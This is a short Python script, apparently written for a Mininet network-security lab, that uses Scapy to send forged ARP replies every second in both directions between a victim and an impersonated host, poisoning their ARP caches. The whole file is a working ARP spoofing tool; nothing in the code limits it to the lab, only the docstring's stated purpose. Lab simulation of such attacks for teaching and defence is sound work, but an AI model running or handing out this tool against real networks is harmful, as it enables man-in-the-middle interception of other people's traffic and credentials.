#!/usr/bin/env python3
"""
arp_spoof.py
------------
Envía respuestas ARP falsificadas de forma continua para simular un
ataque de ARP spoofing dentro del laboratorio Mininet.

Ejecución:
    python3 arp_spoof.py <ip_victima> <ip_a_suplantar> <mac_atacante>

Se detiene con Ctrl+C o al recibir SIGTERM.
"""
import sys
import time
from scapy.all import ARP, send

def main():
    if len(sys.argv) != 4:
        print("Uso: arp_spoof.py <ip_victima> <ip_a_suplantar> <mac_atacante>")
        sys.exit(1)

    victim_ip, spoofed_ip, attacker_mac = sys.argv[1], sys.argv[2], sys.argv[3]

    def send_fake_arp(target_ip, impersonated_ip):
        pkt = ARP(op=2, pdst=target_ip, hwsrc=attacker_mac, psrc=impersonated_ip)
        send(pkt, verbose=False)

    try:
        while True:
            send_fake_arp(victim_ip, spoofed_ip)
            # También al revés, para envenenar la caché en ambos sentidos
            send_fake_arp(spoofed_ip, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
